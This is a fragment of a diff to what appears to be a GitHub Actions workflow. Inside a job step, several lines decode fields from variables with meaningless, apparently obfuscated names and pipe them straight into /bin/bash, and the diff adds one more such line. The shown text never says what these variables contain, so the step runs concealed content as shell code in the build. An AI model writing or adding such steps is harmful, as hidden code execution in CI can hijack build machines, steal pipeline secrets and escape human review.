@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$xiwq06045" | jq -r .jlj08559 | /bin/bash
           echo $p65 | jq -r .a98 | /bin/bash
           echo $szoow731 | jq -r .fxdnz91 | /bin/bash
+          printf '%s' "$a4" | jq -r .chg606 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
